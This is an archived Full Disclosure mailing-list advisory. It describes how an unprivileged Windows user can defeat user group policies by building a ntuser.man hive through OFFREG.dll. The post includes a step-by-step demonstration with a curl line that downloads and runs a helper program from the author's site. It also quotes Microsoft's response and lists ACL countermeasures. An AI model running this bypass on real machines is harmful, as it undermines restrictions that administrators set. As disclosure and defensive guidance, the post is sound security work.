---
title: Defense in depth -- the Microsoft way (part 89): user group	policies don't deserve tamper protection
url: https://seclists.org/fulldisclosure/2025/Jun/13
source: Full Disclosure
date: 2025-06-04
fetch_date: 2025-10-06T22:56:18.180492
---

# Defense in depth -- the Microsoft way (part 89): user group	policies don't deserve tamper protection

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](12)
[By Date](date.html#13)
[![Next](/images/right-icon-16x16.png)](14)

[![Previous](/images/left-icon-16x16.png)](12)
[By Thread](index.html#13)
[![Next](/images/right-icon-16x16.png)](14)

![](/shared/images/nst-icons.svg#search)

# Defense in depth -- the Microsoft way (part 89): user group policies don't deserve tamper protection

---

*From*: "Stefan Kanthak" <stefan.kanthak () nexgo de>
*Date*: Sat, 31 May 2025 20:32:25 +0200

---

```
Hi @ll,

user group policies are stored in DACL-protected registry keys
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies]
respectively [HKEY_CURRENT_USER\Software\Policies] and below, where
only the SYSTEM account and members of the "Administrators" user group
are granted write access.

At logon the user's registry hive "%USERPROFILE%\ntuser.dat" is loaded
with exclusive (read, write and delete/rename) access, thus preventing
modification or removal of the file by the logged-on user.

The MSDN article "About User Profiles"
<https://msdn.microsoft.com/en-us/library/bb776892.aspx> provides some
details and tells about "Mandatory User Profiles"
<https://msdn.microsoft.com/en-us/library/bb776895.aspx> which use a
registry hive "%USERPROFILE%\ntuser.man" instead.

Contrary to the latter, "Mandatory User Profiles" are but NOT just a
special type of "Roaming User Profiles" -- "Local User Profiles"
<https://msdn.microsoft.com/en-us/library/bb776894.aspx> too support
a registry hive "%USERPROFILE%\ntuser.man" which takes precedence
over "%USERPROFILE%\ntuser.dat".

Microsoft shipped the (redistributable) "Offline Registry Library"
OFFREG.dll <https://msdn.microsoft.com/en-us/library/ee210757.aspx>
initially with the Driver Development Kit for Windows 7, but ships it
since several years with Windows too.

"Thanks" to OFFREG.dll every unprivileged user can copy the registry
tree [HKEY_CURRENT_USER] (except of course the registry keys where the
policies are stored;-) to an offline registry hive ntuser.man and thus
get rid of any restrictions previously imposed via user group policies
after logging off and on again.

Demonstration
~~~~~~~~~~~~~

0) Start a command prompt under an unprivileged standard user account
   on Windows 2000 or any later version and run the following command
   lines to display the user's SID and to verify that (s)he can't write
   "Policies" first, i.e. REG.exe outputs "ERROR: access denied", then
   download and execute a tiny CLI program that reads [HKEY_CURRENT_USER]
   and copies it except the registry keys named "Policies" into an
   offline registry hive ntuser.man in the current (working) directory.

WHOAMI.exe /USER
REG.exe ADD HKEY_CURRENT_USER\Software\Policies /VE
REG.exe ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies /VE
CHDIR /D "%USERPROFILE%"
CURL.exe -q -O -R https://skanthak.hier-im-netz.de/temp/GPOFFREG.COM
.\GPOFFREG.com

1) Start another command prompt under an administrator account and run
   the following command lines to set some user group policies for the
   unprivileged user account used in step 0):

SET /P SID=Enter SID shown above
REG.exe ADD HKEY_USERS\%SID%\Software\Policies\Microsoft\Windows\System /V DisableCMD /T REG_DWORD /D 1
REG.exe ADD HKEY_USERS\%SID%\Software\Microsoft\Windows\CurrentVersion\Policies\System /V DisableRegistryTools /T
REG_DWORD /D 1

2) Return to the command prompt opened in step 0) and start REGEDIT.exe,
   REG.exe or CMD.exe to verify that the policies set in step 1) block
   these programs and let them output message( boxe)s "Disabled by your
   administrator":

CMD.exe
REG.exe QUERY HKEY_CURRENT_USER\Software\Policies /S
REG.exe QUERY HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies /S

3) Log the unprivileged user off and on again to let ProfileSvc load the
   ntuser.man created in step 0) instead of ntuser.dat, then start CMD.exe
   and/or REGEDIT.exe to verify that the policies set in step 1) are gone.

4) Run the following command lines in the just started command prompt to
   verify that the "Policies" keys are now empty and writable for the
   unprivileged user:

REG.exe QUERY HKEY_CURRENT_USER\Software\Policies /S
REG.exe QUERY HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies /S
REG.exe ADD HKEY_CURRENT_USER\Software\Policies /VE
REG.exe ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies /VE

Vendor statement
~~~~~~~~~~~~~~~~

The MSRC replied to my report with the following statement:

| You reported that a user can bypass policies set within the HKCU
| registry hive.
| However, the ability of a user to write to the HKCU hive does not
| constitute a violation of a security boundary, as the entire hive
| is owned by the local user, allowing them to write to it without
| restriction.

Counter measures
~~~~~~~~~~~~~~~~

a) Add an NTFS ACE which denies the user the permissions to create files
   in or write the DACL of the directory "%USERPROFILE%" (which is owned
   by the SYSTEM account, but grants the user full access):

CHDIR /D "%USERPROFILE%"
CACLS.exe . /S
SET /P DACL=Copy the output and insert (D;NP;DCWD;;;S-1-5-21-*-*-*-*) in front of the first opening parenthesis
CACLS.exe . /S:%DACL%

b) Add an NTFS ACE which denies the user the permission to write the DACL
   of or add extended attributes to the file "%USERPROFILE%\ntuser.dat":

CACLS.exe ntuser.dat /S
SET /P DACL=Copy the output and insert (D;;RPWD;;;OW) in front of the first opening parenthesis
CACLS.exe ntuser.dat /S:%DACL%

JFTR: without the second counter measure, the user can grant an accomplice
      who has a user account on the machine write access to ntuser.dat or
      add a reparse point.

stay tuned
Stefan Kanthak
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](12)
[By Date](date.html#13)
[![Next](/images/right-icon-16x16.png)](14)

[![Previous](/images/left-icon-16x16.png)](12)
[By Thread](index.html#13)
[![Next](/images/right-icon-16x16.png)](14)

### Current thread:

* **Defense in depth -- the Microsoft way (part 89): user group policies don't deserve tamper protection** *Stefan Kanthak (Jun 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/s...